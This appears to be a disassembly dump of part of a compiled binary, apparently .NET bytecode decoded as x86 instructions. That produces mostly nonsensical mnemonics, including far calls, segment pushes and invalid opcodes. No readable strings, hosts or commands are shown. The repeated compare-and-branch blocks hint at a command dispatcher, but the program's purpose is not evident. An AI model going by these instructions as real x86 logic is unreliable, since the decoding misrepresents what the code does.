  403650:	29 00                	sub    %eax,(%eax)
  403652:	00 00                	add    %al,(%eax)
  403654:	00 00                	add    %al,(%eax)
  403656:	00 00                	add    %al,(%eax)
  403658:	7e 1a                	jle    0x403674
  40365a:	00 00                	add    %al,(%eax)
  40365c:	04 2c                	add    $0x2c,%al
  40365e:	13 7e 10             	adc    0x10(%esi),%edi
  403661:	00 00                	add    %al,(%eax)
  403663:	04 2c                	add    $0x2c,%al
  403665:	0c 7e                	or     $0x7e,%al
  403667:	19 00                	sbb    %eax,(%eax)
  403669:	00 04 17             	add    %al,(%edi,%edx,1)
  40366c:	d6                   	salc
  40366d:	80 19 00             	sbbb   $0x0,(%ecx)
  403670:	00 04 de             	add    %al,(%esi,%ebx,8)
  403673:	0c 28                	or     $0x28,%al
  403675:	2e 00 00             	add    %al,%cs:(%eax)
  403678:	0a 28                	or     (%eax),%ch
  40367a:	30 00                	xor    %al,(%eax)
  40367c:	00 0a                	add    %cl,(%edx)
  40367e:	de 00                	fiadds (%eax)
  403680:	2a 00                	sub    (%eax),%al
  403682:	00 00                	add    %al,(%eax)
  403684:	01 10                	add    %edx,(%eax)
  403686:	00 00                	add    %al,(%eax)
  403688:	00 00                	add    %al,(%eax)
  40368a:	00 00                	add    %al,(%eax)
  40368c:	1c 1c                	sbb    $0x1c,%al
  40368e:	00 0c 32             	add    %cl,(%edx,%esi,1)
  403691:	00 00                	add    %al,(%eax)
  403693:	01 1b                	add    %ebx,(%ebx)
  403695:	30 03                	xor    %al,(%ebx)
  403697:	00 5d 00             	add    %bl,0x0(%ebp)
  40369a:	00 00                	add    %al,(%eax)
  40369c:	1b 00                	sbb    (%eax),%eax
  40369e:	00 11                	add    %dl,(%ecx)
  4036a0:	7e 10                	jle    0x4036b2
  4036a2:	00 00                	add    %al,(%eax)
  4036a4:	04 2c                	add    $0x2c,%al
  4036a6:	45                   	inc    %ebp
  4036a7:	1b 8d 31 00 00 01    	sbb    0x1000031(%ebp),%ecx
  4036ad:	0b 07                	or     (%edi),%eax
  4036af:	16                   	push   %ss
  4036b0:	72 b1                	jb     0x403663
  4036b2:	06                   	push   %es
  4036b3:	00 70 a2             	add    %dh,-0x5e(%eax)
  4036b6:	07                   	pop    %es
  4036b7:	17                   	pop    %ss
  4036b8:	7e 0a                	jle    0x4036c4
  4036ba:	00 00                	add    %al,(%eax)
  4036bc:	04 a2                	add    $0xa2,%al
  4036be:	07                   	pop    %es
  4036bf:	18 28                	sbb    %ch,(%eax)
  4036c1:	05 01 00 06 a2       	add    $0xa2060001,%eax
  4036c6:	07                   	pop    %es
  4036c7:	19 7e 0a             	sbb    %edi,0xa(%esi)
  4036ca:	00 00                	add    %al,(%eax)
  4036cc:	04 a2                	add    $0xa2,%al
  4036ce:	07                   	pop    %es
  4036cf:	1a 7e 30             	sbb    0x30(%esi),%bh
  4036d2:	00 00                	add    %al,(%eax)
  4036d4:	04 a2                	add    $0xa2,%al
  4036d6:	07                   	pop    %es
  4036d7:	28 94 00 00 0a 28 45 	sub    %dl,0x45280a00(%eax,%eax,1)
  4036de:	00 00                	add    %al,(%eax)
  4036e0:	06                   	push   %es
  4036e1:	17                   	pop    %ss
  4036e2:	80 1a 00             	sbbb   $0x0,(%edx)
  4036e5:	00 04 28             	add    %al,(%eax,%ebp,1)
  4036e8:	93                   	xchg   %eax,%ebx
  4036e9:	00 00                	add    %al,(%eax)
  4036eb:	0a de                	or     %dh,%bl
  4036ed:	0e                   	push   %cs
  4036ee:	25 28 2e 00 00       	and    $0x2e28,%eax
  4036f3:	0a 0a                	or     (%edx),%cl
  4036f5:	28 30                	sub    %dh,(%eax)
  4036f7:	00 00                	add    %al,(%eax)
  4036f9:	0a de                	or     %dh,%bl
  4036fb:	00 2a                	add    %ch,(%edx)
  4036fd:	00 00                	add    %al,(%eax)
  4036ff:	00 01                	add    %al,(%ecx)
  403701:	10 00                	adc    %al,(%eax)
  403703:	00 00                	add    %al,(%eax)
  403705:	00 00                	add    %al,(%eax)
  403707:	00 4e 4e             	add    %cl,0x4e(%esi)
  40370a:	00 0e                	add    %cl,(%esi)
  40370c:	32 00                	xor    (%eax),%al
  40370e:	00 01                	add    %al,(%ecx)
  403710:	1b 30                	sbb    (%eax),%esi
  403712:	08 00                	or     %al,(%eax)
  403714:	d0 07                	rolb   $1,(%edi)
  403716:	00 00                	add    %al,(%eax)
  403718:	1c 00                	sbb    $0x0,%al
  40371a:	00 11                	add    %dl,(%ecx)
  40371c:	02 28                	add    (%eax),%ch
  40371e:	0f 01 00             	sgdtl  (%eax)
  403721:	06                   	push   %es
  403722:	28 07                	sub    %al,(%edi)
  403724:	01 00                	add    %eax,(%eax)
  403726:	06                   	push   %es
  403727:	7e 0a                	jle    0x403733
  403729:	00 00                	add    %al,(%eax)
  40372b:	04 15                	add    $0x15,%al
  40372d:	16                   	push   %ss
  40372e:	28 95 00 00 0a 0a    	sub    %dl,0xa0a0000(%ebp)
  403734:	06                   	push   %es
  403735:	16                   	push   %ss
  403736:	9a 13 13 11 13 72 1d 	lcall  $0x1d72,$0x13111313
  40373d:	12 00                	adc    (%eax),%al
  40373f:	70 16                	jo     0x403757
  403741:	28 60 00             	sub    %ah,0x0(%eax)
  403744:	00 0a                	add    %cl,(%edx)
  403746:	16                   	push   %ss
  403747:	33 2f                	xor    (%edi),%ebp
  403749:	16                   	push   %ss
  40374a:	80 1a 00             	sbbb   $0x0,(%edx)
  40374d:	00 04 72             	add    %al,(%edx,%esi,2)
  403750:	1d 12 00 70 7e       	sbb    $0x7e700012,%eax
  403755:	0a 00                	or     (%eax),%al
  403757:	00 04 7e             	add    %al,(%esi,%edi,2)
  40375a:	19 00                	sbb    %eax,(%eax)
  40375c:	00 04 28             	add    %al,(%eax,%ebp,1)
  40375f:	8a 00                	mov    (%eax),%al
  403761:	00 0a                	add    %cl,(%edx)
  403763:	28 39                	sub    %bh,(%ecx)
  403765:	00 00                	add    %al,(%eax)
  403767:	0a 28                	or     (%eax),%ch
  403769:	45                   	inc    %ebp
  40376a:	00 00                	add    %al,(%eax)
  40376c:	06                   	push   %es
  40376d:	16                   	push   %ss
  40376e:	80 19 00             	sbbb   $0x0,(%ecx)
  403771:	00 04 38             	add    %al,(%eax,%edi,1)
  403774:	56                   	push   %esi
  403775:	07                   	pop    %es
  403776:	00 00                	add    %al,(%eax)
  403778:	11 13                	adc    %edx,(%ebx)
  40377a:	72 27                	jb     0x4037a3
  40377c:	12 00                	adc    (%eax),%al
  40377e:	70 16                	jo     0x403796
  403780:	28 60 00             	sub    %ah,0x0(%eax)
  403783:	00 0a                	add    %cl,(%edx)
  403785:	16                   	push   %ss
  403786:	33 1a                	xor    (%edx),%ebx
  403788:	28 e9                	sub    %ch,%cl
  40378a:	00 00                	add    %al,(%eax)
  40378c:	06                   	push   %es
  40378d:	28 11                	sub    %dl,(%ecx)
  40378f:	01 00                	add    %eax,(%eax)
  403791:	06                   	push   %es
  403792:	28 96 00 00 0a 16    	sub    %dl,0x160a0000(%esi)
  403798:	28 2f                	sub    %ch,(%edi)
  40379a:	00 00                	add    %al,(%eax)
  40379c:	0a 38                	or     (%eax),%bh
  40379e:	2c 07                	sub    $0x7,%al
  4037a0:	00 00                	add    %al,(%eax)
  4037a2:	11 13                	adc    %edx,(%ebx)
  4037a4:	72 2f                	jb     0x4037d5
  4037a6:	12 00                	adc    (%eax),%al
  4037a8:	70 16                	jo     0x4037c0
  4037aa:	28 60 00             	sub    %ah,0x0(%eax)
  4037ad:	00 0a                	add    %cl,(%edx)
  4037af:	16                   	push   %ss
  4037b0:	33 25 28 e9 00 00    	xor    0xe928,%esp
  4037b6:	06                   	push   %es
  4037b7:	7e 11                	jle    0x4037ca
  4037b9:	00 00                	add    %al,(%eax)
  4037bb:	04 18                	add    $0x18,%al
  4037bd:	6f                   	outsl  %ds:(%esi),(%dx)
  4037be:	97                   	xchg   %eax,%edi
  4037bf:	00 00                	add    %al,(%eax)
  4037c1:	0a 7e 11             	or     0x11(%esi),%bh
  4037c4:	00 00                	add    %al,(%eax)
  4037c6:	04 6f                	add    $0x6f,%al
  4037c8:	91                   	xchg   %eax,%ecx
  4037c9:	00 00                	add    %al,(%eax)
  4037cb:	0a 16                	or     (%esi),%dl
  4037cd:	28 2f                	sub    %ch,(%edi)
  4037cf:	00 00                	add    %al,(%eax)
  4037d1:	0a 38                	or     (%eax),%bh
  4037d3:	f7 06 00 00 11 13    	testl  $0x13110000,(%esi)
  4037d9:	72 3b                	jb     0x403816
  4037db:	12 00                	adc    (%eax),%al
  4037dd:	70 16                	jo     0x4037f5
  4037df:	28 60 00             	sub    %ah,0x0(%eax)
  4037e2:	00 0a                	add    %cl,(%edx)
  4037e4:	16                   	push   %ss
  4037e5:	33 0d 16 14 14 28    	xor    0x28141416,%ecx
  4037eb:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4037ec:	00 00                	add    %al,(%eax)
  4037ee:	06                   	push   %es
  4037ef:	38 da                	cmp    %bl,%dl
  4037f1:	06                   	push   %es
  4037f2:	00 00                	add    %al,(%eax)
  4037f4:	11 13                	adc    %edx,(%ebx)
  4037f6:	72 4f                	jb     0x403847
  4037f8:	12 00                	adc    (%eax),%al
  4037fa:	70 16                	jo     0x403812
  4037fc:	28 60 00             	sub    %ah,0x0(%eax)
  4037ff:	00 0a                	add    %cl,(%edx)
  403801:	16                   	push   %ss
  403802:	33 1b                	xor    (%ebx),%ebx
  403804:	17                   	pop    %ss
  403805:	06                   	push   %es
  403806:	17                   	pop    %ss
  403807:	9a 06 18 9a 28 98 00 	lcall  $0x98,$0x289a1806
  40380e:	00 0a                	add    %cl,(%edx)
  403810:	28 0c 01             	sub    %cl,(%ecx,%eax,1)
  403813:	00 06                	add    %al,(%esi)
  403815:	28 a6 00 00 06 38    	sub    %ah,0x38060000(%esi)
  40381b:	af                   	scas   %es:(%edi),%eax
  40381c:	06                   	push   %es
  40381d:	00 00                	add    %al,(%eax)
  40381f:	11 13                	adc    %edx,(%ebx)
  403821:	72 5d                	jb     0x403880
  403823:	12 00                	adc    (%eax),%al
  403825:	70 16                	jo     0x40383d
  403827:	28 60 00             	sub    %ah,0x0(%eax)
  40382a:	00 0a                	add    %cl,(%edx)
  40382c:	16                   	push   %ss
  40382d:	33 1a                	xor    (%edx),%ebx
  40382f:	06                   	push   %es
  403830:	17                   	pop    %ss
  403831:	9a 06 18 9a 28 98 00 	lcall  $0x98,$0x289a1806
  403838:	00 0a                	add    %cl,(%edx)
  40383a:	28 0c 01             	sub    %cl,(%ecx,%eax,1)
  40383d:	00 06                	add    %al,(%esi)
  40383f:	28 81 00 00 06 38    	sub    %al,0x38060000(%ecx)
  403845:	85 06                	test   %eax,(%esi)
  403847:	00 00                	add    %al,(%eax)
  403849:	11 13                	adc    %edx,(%ebx)
  40384b:	72 63                	jb     0x4038b0
  40384d:	12 00                	adc    (%eax),%al
  40384f:	70 16                	jo     0x403867
  403851:	28 60 00             	sub    %ah,0x0(%eax)
  403854:	00 0a                	add    %cl,(%edx)
  403856:	16                   	push   %ss
  403857:	33 18                	xor    (%eax),%ebx
  403859:	06                   	push   %es
  40385a:	17                   	pop    %ss
  40385b:	9a 28 98 00 00 0a 28 	lcall  $0x280a,$0x9828
  403862:	0c 01                	or     $0x1,%al
  403864:	00 06                	add    %al,(%esi)
  403866:	28 82 00 00 06 26    	sub    %al,0x26060000(%edx)
  40386c:	38 5d 06             	cmp    %bl,0x6(%ebp)
  40386f:	00 00                	add    %al,(%eax)
  403871:	11 13                	adc    %edx,(%ebx)
  403873:	72 69                	jb     0x4038de
  403875:	12 00                	adc    (%eax),%al
  403877:	70 16                	jo     0x40388f
  403879:	28 60 00             	sub    %ah,0x0(%eax)
  40387c:	00 0a                	add    %cl,(%edx)
  40387e:	16                   	push   %ss
  40387f:	33 5d 17             	xor    0x17(%ebp),%ebx
  403882:	28 99 00 00 0a 20    	sub    %bl,0x200a0000(%ecx)
  403888:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40388b:	00 28                	add    %ch,(%eax)
  40388d:	9a 00 00 0a 20 0f 27 	lcall  $0x270f,$0x200a0000
  403894:	00 00                	add    %al,(%eax)
  403896:	28 9b 00 00 0a de    	sub    %bl,-0x21f60000(%ebx)
  40389c:	0c 28                	or     $0x28,%al
  40389e:	2e 00 00             	add    %al,%cs:(%eax)
  4038a1:	0a 28                	or     (%eax),%ch
  4038a3:	30 00                	xor    %al,(%eax)
  4038a5:	00 0a                	add    %cl,(%edx)
  4038a7:	de 00                	fiadds (%eax)
  4038a9:	28 9c 00 00 0a 1c 28 	sub    %bl,0x281c0a00(%eax,%eax,1)
  4038b0:	fd                   	std
  4038b1:	00 00                	add    %al,(%eax)
  4038b3:	06                   	push   %es
  4038b4:	06                   	push   %es
  4038b5:	17                   	pop    %ss
  4038b6:	9a 28 2b 00 00 0a 28 	lcall  $0x280a,$0x2b28
  4038bd:	9d                   	popf
  4038be:	00 00                	add    %al,(%eax)
  4038c0:	0a 0b                	or     (%ebx),%cl
  4038c2:	73 9e                	jae    0x403862
  4038c4:	00 00                	add    %al,(%eax)
  4038c6:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4038c9:	06                   	push   %es
  4038ca:	18 9a 07 6f 9f 00    	sbb    %bl,0x9f6f07(%edx)
  4038d0:	00 0a                	add    %cl,(%edx)
  4038d2:	07                   	pop    %es
  4038d3:	28 a0 00 00 0a 26    	sub    %ah,0x260a0000(%eax)
  4038d9:	38 f0                	cmp    %dh,%al
  4038db:	05 00 00 11 13       	add    $0x13110000,%eax
  4038e0:	72 6f                	jb     0x403951
  4038e2:	12 00                	adc    (%eax),%al
  4038e4:	70 16                	jo     0x4038fc
  4038e6:	28 60 00             	sub    %ah,0x0(%eax)
  4038e9:	00 0a                	add    %cl,(%edx)
  4038eb:	16                   	push   %ss
  4038ec:	33 0e                	xor    (%esi),%ecx
  4038ee:	06                   	push   %es
  4038ef:	17                   	pop    %ss
  4038f0:	9a 16 28 7d 00 00 06 	lcall  $0x600,$0x7d2816
  4038f7:	38 d2                	cmp    %dl,%dl
  4038f9:	05 00 00 11 13       	add    $0x13110000,%eax
  4038fe:	72 7f                	jb     0x40397f
  403900:	12 00                	adc    (%eax),%al
  403902:	70 16                	jo     0x40391a
  403904:	28 60 00             	sub    %ah,0x0(%eax)
  403907:	00 0a                	add    %cl,(%edx)
  403909:	16                   	push   %ss
  40390a:	33 0e                	xor    (%esi),%ecx
  40390c:	06                   	push   %es
  40390d:	17                   	pop    %ss
  40390e:	9a 17 28 7d 00 00 06 	lcall  $0x600,$0x7d2817
  403915:	38 b4 05 00 00 11 13 	cmp    %dh,0x13110000(%ebp,%eax,1)
  40391c:	72 8f                	jb     0x4038ad
  40391e:	12 00                	adc    (%eax),%al
  403920:	70 16                	jo     0x403938
  403922:	28 60 00             	sub    %ah,0x0(%eax)
  403925:	00 0a                	add    %cl,(%edx)
  403927:	16                   	push   %ss
  403928:	33 13                	xor    (%ebx),%edx
  40392a:	72 a5                	jb     0x4038d1
  40392c:	12 00                	adc    (%eax),%al
  40392e:	70 16                	jo     0x403946
  403930:	16                   	push   %ss
  403931:	15 28 a1 00 00       	adc    $0xa128,%eax
  403936:	0a 26                	or     (%esi),%ah
  403938:	38 91 05 00 00 11    	cmp    %dl,0x11000005(%ecx)
  40393e:	13 72 d5             	adc    -0x2b(%edx),%esi
  403941:	12 00                	adc    (%eax),%al
  403943:	70 16                	jo     0x40395b
  403945:	28 60 00             	sub    %ah,0x0(%eax)
  403948:	00 0a                	add    %cl,(%edx)
  40394a:	16                   	push   %ss
  40394b:	33 13                	xor    (%ebx),%edx
  40394d:	72 e9                	jb     0x403938
  40394f:	12 00                	adc    (%eax),%al
  403951:	70 16                	jo     0x403969
  403953:	16                   	push   %ss
  403954:	15 28 a1 00 00       	adc    $0xa128,%eax
  403959:	0a 26                	or     (%esi),%ah
  40395b:	38 6e 05             	cmp    %ch,0x5(%esi)
  40395e:	00 00                	add    %al,(%eax)
  403960:	11 13                	adc    %edx,(%ebx)
  403962:	72 19                	jb     0x40397d
  403964:	13 00                	adc    (%eax),%eax
  403966:	70 16                	jo     0x40397e
  403968:	28 60 00             	sub    %ah,0x0(%eax)
  40396b:	00 0a                	add    %cl,(%edx)
  40396d:	16                   	push   %ss
  40396e:	33 13                	xor    (%ebx),%edx
  403970:	72 2b                	jb     0x40399d
  403972:	13 00                	adc    (%eax),%eax
  403974:	70 16                	jo     0x40398c
  403976:	16                   	push   %ss
  403977:	15 28 a1 00 00       	adc    $0xa128,%eax
  40397c:	0a 26                	or     (%esi),%ah
  40397e:	38 4b 05             	cmp    %cl,0x5(%ebx)
  403981:	00 00                	add    %al,(%eax)
  403983:	11 13                	adc    %edx,(%ebx)
  403985:	72 4b                	jb     0x4039d2
  403987:	13 00                	adc    (%eax),%eax
  403989:	70 16                	jo     0x4039a1
  40398b:	28 60 00             	sub    %ah,0x0(%eax)
  40398e:	00 0a                	add    %cl,(%edx)
  403990:	16                   	push   %ss
  403991:	33 11                	xor    (%ecx),%edx
  403993:	06                   	push   %es
  403994:	17                   	pop    %ss
  403995:	9a 16 16 15 28 a1 00 	lcall  $0xa1,$0x28151616
  40399c:	00 0a                	add    %cl,(%edx)
  40399e:	26 38 2a             	cmp    %ch,%es:(%edx)
  4039a1:	05 00 00 11 13       	add    $0x13110000,%eax
  4039a6:	72 5d                	jb     0x403a05
  4039a8:	13 00                	adc    (%eax),%eax
  4039aa:	70 16                	jo     0x4039c2
  4039ac:	28 60 00             	sub    %ah,0x0(%eax)
  4039af:	00 0a                	add    %cl,(%edx)
  4039b1:	16                   	push   %ss
  4039b2:	33 42 7e             	xor    0x7e(%edx),%eax
  4039b5:	1d 00 00 04 6f       	sbb    $0x6f040000,%eax
  4039ba:	a2 00 00 0a de       	mov    %al,0xde0a0000
  4039bf:	0e                   	push   %cs
  4039c0:	25 28 2e 00 00       	and    $0x2e28,%eax
  4039c5:	0a 0d 28 30 00 00    	or     0x3028,%cl
  4039cb:	0a de                	or     %dh,%bl
  4039cd:	00 14 fe             	add    %dl,(%esi,%edi,8)
  4039d0:	06                   	push   %es
  4039d1:	83 00 00             	addl   $0x0,(%eax)
  4039d4:	06                   	push   %es
  4039d5:	73 85                	jae    0x40395c
  4039d7:	00 00                	add    %al,(%eax)
  4039d9:	0a 73 86             	or     -0x7a(%ebx),%dh
  4039dc:	00 00                	add    %al,(%eax)
  4039de:	0a 80 1d 00 00 04    	or     0x400001d(%eax),%al
  4039e4:	7e 1d                	jle    0x403a03
  4039e6:	00 00                	add    %al,(%eax)
  4039e8:	04 06                	add    $0x6,%al
  4039ea:	17                   	pop    %ss
  4039eb:	9a 6f a3 00 00 0a 38 	lcall  $0x380a,$0xa36f
  4039f2:	d8 04 00             	fadds  (%eax,%eax,1)
  4039f5:	00 11                	add    %dl,(%ecx)
  4039f7:	13 72 71             	adc    0x71(%edx),%esi
  4039fa:	13 00                	adc    (%eax),%eax
  4039fc:	70 16                	jo     0x403a14
  4039fe:	28 60 00             	sub    %ah,0x0(%eax)
  403a01:	00 0a                	add    %cl,(%edx)
  403a03:	16                   	push   %ss
  403a04:	33 20                	xor    (%eax),%esp
  403a06:	7e 1d                	jle    0x403a25
  403a08:	00 00                	add    %al,(%eax)
  403a0a:	04 6f                	add    $0x6f,%al
  403a0c:	a2 00 00 0a de       	mov    %al,0xde0a0000
  403a11:	0f 25                	(bad)
  403a13:	28 2e                	sub    %ch,(%esi)
  403a15:	00 00                	add    %al,(%eax)
  403a17:	0a 13                	or     (%ebx),%dl
  403a19:	04 28                	add    $0x28,%al
  403a1b:	30 00                	xor    %al,(%eax)
  403a1d:	00 0a                	add    %cl,(%edx)
  403a1f:	de 00                	fiadds (%eax)
  403a21:	38 a8 04 00 00 11    	cmp    %ch,0x11000004(%eax)
  403a27:	13 72 83             	adc    -0x7d(%edx),%esi
  403a2a:	13 00                	adc    (%eax),%eax
  403a2c:	70 16                	jo     0x403a44
  403a2e:	28 60 00             	sub    %ah,0x0(%eax)
  403a31:	00 0a                	add    %cl,(%edx)
  403a33:	16                   	push   %ss
  403a34:	33 43 7e             	xor    0x7e(%ebx),%eax
  403a37:	1e                   	push   %ds
  403a38:	00 00                	add    %al,(%eax)
  403a3a:	04 6f                	add    $0x6f,%al
  403a3c:	a2 00 00 0a de       	mov    %al,0xde0a0000
  403a41:	0f 25                	(bad)
  403a43:	28 2e                	sub    %ch,(%esi)
  403a45:	00 00                	add    %al,(%eax)
  403a47:	0a 13                	or     (%ebx),%dl
  403a49:	05 28 30 00 00       	add    $0x3028,%eax
  403a4e:	0a de                	or     %dh,%bl
  403a50:	00 14 fe             	add    %dl,(%esi,%edi,8)
  403a53:	06                   	push   %es
  403a54:	84 00                	test   %al,(%eax)
  403a56:	00 06                	add    %al,(%esi)
  403a58:	73 85                	jae    0x4039df
  403a5a:	00 00                	add    %al,(%eax)
  403a5c:	0a 73 86             	or     -0x7a(%ebx),%dh
  403a5f:	00 00                	add    %al,(%eax)
  403a61:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403a67:	7e 1e                	jle    0x403a87
  403a69:	00 00                	add    %al,(%eax)
  403a6b:	04 06                	add    $0x6,%al
  403a6d:	17                   	pop    %ss
  403a6e:	9a 6f a3 00 00 0a 38 	lcall  $0x380a,$0xa36f
  403a75:	55                   	push   %ebp
  403a76:	04 00                	add    $0x0,%al
  403a78:	00 11                	add    %dl,(%ecx)
  403a7a:	13 72 9b             	adc    -0x65(%edx),%esi
  403a7d:	13 00                	adc    (%eax),%eax
  403a7f:	70 16                	jo     0x403a97
  403a81:	28 60 00             	sub    %ah,0x0(%eax)
  403a84:	00 0a                	add    %cl,(%edx)
  403a86:	16                   	push   %ss
  403a87:	33 20                	xor    (%eax),%esp
  403a89:	7e 1e                	jle    0x403aa9
  403a8b:	00 00                	add    %al,(%eax)
  403a8d:	04 6f                	add    $0x6f,%al
  403a8f:	a2 00 00 0a de       	mov    %al,0xde0a0000
  403a94:	0f 25                	(bad)
  403a96:	28 2e                	sub    %ch,(%esi)
  403a98:	00 00                	add    %al,(%eax)
  403a9a:	0a 13                	or     (%ebx),%dl
  403a9c:	06                   	push   %es
  403a9d:	28 30                	sub    %dh,(%eax)
  403a9f:	00 00                	add    %al,(%eax)
  403aa1:	0a de                	or     %dh,%bl
  403aa3:	00 38                	add    %bh,(%eax)
  403aa5:	25 04 00 00 11       	and    $0x11000004,%eax
  403aaa:	13 72 b1             	adc    -0x4f(%edx),%esi
  403aad:	13 00                	adc    (%eax),%eax
  403aaf:	70 16                	jo     0x403ac7
  403ab1:	28 60 00             	sub    %ah,0x0(%eax)
  403ab4:	00 0a                	add    %cl,(%edx)
  403ab6:	16                   	push   %ss
  403ab7:	33 1e                	xor    (%esi),%ebx
  403ab9:	72 b1                	jb     0x403a6c
  403abb:	13 00                	adc    (%eax),%eax
  403abd:	70 7e                	jo     0x403b3d
  403abf:	0a 00                	or     (%eax),%al
  403ac1:	00 04 28             	add    %al,(%eax,%ebp,1)
  403ac4:	08 01                	or     %al,(%ecx)
  403ac6:	00 06                	add    %al,(%esi)
  403ac8:	28 39                	sub    %bh,(%ecx)
  403aca:	00 00                	add    %al,(%eax)
  403acc:	0a 28                	or     (%eax),%ch
  403ace:	45                   	inc    %ebp
  403acf:	00 00                	add    %al,(%eax)
  403ad1:	06                   	push   %es
  403ad2:	38 f7                	cmp    %dh,%bh
  403ad4:	03 00                	add    (%eax),%eax
  403ad6:	00 11                	add    %dl,(%ecx)
  403ad8:	13 72 bd             	adc    -0x43(%edx),%esi
  403adb:	13 00                	adc    (%eax),%eax
  403add:	70 16                	jo     0x403af5
  403adf:	28 60 00             	sub    %ah,0x0(%eax)
  403ae2:	00 0a                	add    %cl,(%edx)
  403ae4:	16                   	push   %ss
  403ae5:	33 6a 1f             	xor    0x1f(%edx),%ebp
  403ae8:	25 28 a4 00 00       	and    $0xa428,%eax
  403aed:	0a 72 c9             	or     -0x37(%edx),%dh
  403af0:	13 00                	adc    (%eax),%eax
  403af2:	70 28                	jo     0x403b1c
  403af4:	2b 00                	sub    (%eax),%eax
  403af6:	00 0a                	add    %cl,(%edx)
  403af8:	13 07                	adc    (%edi),%eax
  403afa:	1d 8d 31 00 00       	sbb    $0x318d,%eax
  403aff:	01 13                	add    %edx,(%ebx)
  403b01:	14 11                	adc    $0x11,%al
  403b03:	14 16                	adc    $0x16,%al
  403b05:	72 bd                	jb     0x403ac4
  403b07:	13 00                	adc    (%eax),%eax
  403b09:	70 a2                	jo     0x403aad
  403b0b:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403b0e:	7e 0a                	jle    0x403b1a
  403b10:	00 00                	add    %al,(%eax)
  403b12:	04 a2                	add    $0xa2,%al
  403b14:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403b17:	28 08                	sub    %cl,(%eax)
  403b19:	01 00                	add    %eax,(%eax)
  403b1b:	06                   	push   %es
  403b1c:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403b21:	0a 00                	or     (%eax),%al
  403b23:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403b26:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403b29:	11 07                	adc    %eax,(%edi)
  403b2b:	a2 11 14 1b 7e       	mov    %al,0x7e1b1411
  403b30:	0a 00                	or     (%eax),%al
  403b32:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403b35:	11 14 1c             	adc    %edx,(%esp,%ebx,1)
  403b38:	11 07                	adc    %eax,(%edi)
  403b3a:	28 a5 00 00 0a a2    	sub    %ah,-0x5df60000(%ebp)
  403b40:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403b43:	94                   	xchg   %eax,%esp
  403b44:	00 00                	add    %al,(%eax)
  403b46:	0a 28                	or     (%eax),%ch
  403b48:	45                   	inc    %ebp
  403b49:	00 00                	add    %al,(%eax)
  403b4b:	06                   	push   %es
  403b4c:	38 7d 03             	cmp    %bh,0x3(%ebp)
  403b4f:	00 00                	add    %al,(%eax)
  403b51:	11 13                	adc    %edx,(%ebx)
  403b53:	72 ef                	jb     0x403b44
  403b55:	13 00                	adc    (%eax),%eax
  403b57:	70 16                	jo     0x403b6f
  403b59:	28 60 00             	sub    %ah,0x0(%eax)
  403b5c:	00 0a                	add    %cl,(%edx)
  403b5e:	16                   	push   %ss
  403b5f:	40                   	inc    %eax
  403b60:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403b61:	00 00                	add    %al,(%eax)
  403b63:	00 06                	add    %al,(%esi)
  403b65:	17                   	pop    %ss
  403b66:	9a 06 18 9a 28 a6 00 	lcall  $0xa6,$0x289a1806
  403b6d:	00 0a                	add    %cl,(%edx)
  403b6f:	1b 8d 31 00 00 01    	sbb    0x1000031(%ebp),%ecx
  403b75:	13 14 11             	adc    (%ecx,%edx,1),%edx
  403b78:	14 16                	adc    $0x16,%al
  403b7a:	72 fd                	jb     0x403b79
  403b7c:	13 00                	adc    (%eax),%eax
  403b7e:	70 a2                	jo     0x403b22
  403b80:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403b83:	7e 0a                	jle    0x403b8f
  403b85:	00 00                	add    %al,(%eax)
  403b87:	04 a2                	add    $0xa2,%al
  403b89:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403b8c:	28 08                	sub    %cl,(%eax)
  403b8e:	01 00                	add    %eax,(%eax)
  403b90:	06                   	push   %es
  403b91:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403b96:	0a 00                	or     (%eax),%al
  403b98:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403b9b:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403b9e:	72 0f                	jb     0x403baf
  403ba0:	14 00                	adc    $0x0,%al
  403ba2:	70 a2                	jo     0x403b46
  403ba4:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  403ba7:	94                   	xchg   %eax,%esp
  403ba8:	00 00                	add    %al,(%eax)
  403baa:	0a 28                	or     (%eax),%ch
  403bac:	45                   	inc    %ebp
  403bad:	00 00                	add    %al,(%eax)
  403baf:	06                   	push   %es
  403bb0:	de 52 25             	ficoms 0x25(%edx)
  403bb3:	28 2e                	sub    %ch,(%esi)
  403bb5:	00 00                	add    %al,(%eax)
  403bb7:	0a 13                	or     (%ebx),%dl
  403bb9:	08 1b                	or     %bl,(%ebx)
  403bbb:	8d 31                	lea    (%ecx),%esi
  403bbd:	00 00                	add    %al,(%eax)
  403bbf:	01 13                	add    %edx,(%ebx)
  403bc1:	14 11                	adc    $0x11,%al
  403bc3:	14 16                	adc    $0x16,%al
  403bc5:	72 3d                	jb     0x403c04
  403bc7:	14 00                	adc    $0x0,%al
  403bc9:	70 a2                	jo     0x403b6d
  403bcb:	11 14 17             	adc    %edx,(%edi,%edx,1)
  403bce:	7e 0a                	jle    0x403bda
  403bd0:	00 00                	add    %al,(%eax)
  403bd2:	04 a2                	add    $0xa2,%al
  403bd4:	11 14 18             	adc    %edx,(%eax,%ebx,1)
  403bd7:	28 08                	sub    %cl,(%eax)
  403bd9:	01 00                	add    %eax,(%eax)
  403bdb:	06                   	push   %es
  403bdc:	a2 11 14 19 7e       	mov    %al,0x7e191411
  403be1:	0a 00                	or     (%eax),%al
  403be3:	00 04 a2             	add    %al,(%edx,%eiz,4)
  403be6:	11 14 1a             	adc    %edx,(%edx,%ebx,1)
  403be9:	11 08                	adc    %ecx,(%eax)
  403beb:	6f                   	outsl  %ds:(%esi),(%dx)
  403bec:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403bed:	00 00                	add    %al,(%eax)
  403bef:	0a a2 11 14 28 94    	or     -0x6bd7ebef(%edx),%ah
